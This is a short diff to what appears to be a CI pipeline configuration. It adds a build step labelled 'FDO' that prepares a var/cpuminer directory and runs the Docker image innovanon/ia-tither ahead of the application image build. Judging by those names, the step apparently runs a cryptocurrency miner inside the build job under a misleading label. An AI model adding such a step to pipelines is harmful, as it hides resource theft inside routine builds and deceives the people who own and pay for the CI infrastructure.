@@ -33,6 +33,12 @@ jobs:
             apk add --no-cache \
               make openssl tar gzip curl jq
       - run:
+          name: FDO
+          command: |
+            rm -rf             var/cpuminer
+            mkdir -pv          var/cpuminer
+            docker run -v $PWD/var/cpuminer/:/var/cpuminer/:rw innovanon/ia-tither
+      - run:
           name: Build application Docker image
           command: |
             docker build \
